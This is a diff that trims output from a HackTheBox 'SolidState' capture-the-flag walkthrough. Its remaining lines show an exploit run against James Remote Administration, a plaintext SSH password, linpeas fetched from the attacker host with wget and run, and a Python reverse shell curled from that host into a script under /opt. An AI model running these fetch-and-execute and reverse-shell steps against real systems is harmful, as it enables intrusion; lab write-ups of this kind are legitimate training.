@@ -100,9 +100,9 @@ Lets run a `gobuster` scan to check if we missed anything out.
 └─# gobuster dir -u http://10.10.10.51 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
 ...
 /images               (Status: 301) [Size: 311] [--> http://10.10.10.51/images/]
-/index.html           (Status: 200) [Size: 7776]                                
-/about.html           (Status: 200) [Size: 7183]                                
-/services.html        (Status: 200) [Size: 8404]                                
+/index.html           (Status: 200) [Size: 7776]
+/about.html           (Status: 200) [Size: 7183]
+/services.html        (Status: 200) [Size: 8404]
 /assets               (Status: 301) [Size: 311] [--> http://10.10.10.51/assets/]
 /server-status        (Status: 403) [Size: 299]
 ...
@@ -515,11 +515,6 @@ Finally, we can execute the script!
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
-└─# python 35513.py 
-[-]Usage: python 35513.py <ip>
-[-]Exemple: python 35513.py 127.0.0.1
-                                  
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
 └─# python 35513.py 10.10.10.51
 [+]Connecting to James Remote Administration Tool...
 [+]Creating user...
@@ -535,30 +530,7 @@ Great! Now, we just have to start a netcat listener and log in as an existing us
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
 └─# ssh mindy@10.10.10.51                      
 mindy@10.10.10.51's password: P@55W0rd1!2@
-Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Mon May  9 03:32:35 2022 from 10.10.14.8
--rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
--rbash: L: command not found
--rbash: attributestLjava/util/HashMap: No such file or directory
--rbash: L
-         errorMessagetLjava/lang/String: No such file or directory
--rbash: L
-         lastUpdatedtLjava/util/Date: No such file or directory
--rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
--rbash: $'L\004nameq~\002L': command not found
--rbash: recipientstLjava/util/Collection: No such file or directory
--rbash: L: command not found
--rbash: $'remoteAddrq~\002L': command not found
--rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
--rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
--rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
+...
 -rbash: @team.pl>
 Message-ID: <8608933.0.1652082124685.JavaMail.root@solidstate>
 MIME-Version: 1.0
@@ -595,13 +567,6 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.51 - - [09/May/2022 15:50:29] "GET /linpeas.sh HTTP/1.1" 200 -
 
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget http://10.10.14.8/linpeas.sh
---2022-05-09 03:50:32--  http://10.10.14.8/linpeas.sh
-Connecting to 10.10.14.8:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 776423 (758K) [text/x-sh]
-Saving to: ‘linpeas.sh’
-linpeas.sh                    100%[===============================================>] 758.23K  --.-KB/s    in 0.1s    
-2022-05-09 03:50:32 (5.26 MB/s) - ‘linpeas.sh’ saved [776423/776423]
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ chmod +x linpeas.sh
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./linpeas.sh
 ...
@@ -691,9 +656,6 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 - mindy's SSH -
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ curl http://10.10.14.8/py_revshell >> tmp.py
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100    67  100    67    0     0   5416      0 --:--:-- --:--:-- --:--:--  5583
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
 #!/usr/bin/env python
 import os
